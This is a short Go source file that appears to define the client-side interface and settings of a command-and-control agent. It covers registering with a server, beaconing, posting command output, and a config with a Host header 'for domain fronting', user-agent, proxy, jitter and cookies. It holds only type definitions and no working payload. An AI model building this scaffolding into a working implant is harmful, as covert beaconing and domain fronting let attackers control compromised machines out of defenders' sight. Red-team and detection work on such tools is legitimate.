package bark

import "net/http"

type Barker interface {
	Register(string) ([]byte, error)
	Beacon(string) ([]byte, error)
	PostOutput(string, []byte) ([]byte, error)
}

type BarkConfig struct {
	//addr
	BarkHost string

	//Host header (for domain fronting) and user-agent
	Hh string
	Ua string

	Proxyurl  string
	Proxyuser string
	Proxy     bool

	//transport
	Jit float64
	Tr  http.RoundTripper

	//cookies:
	Jar http.CookieJar
}
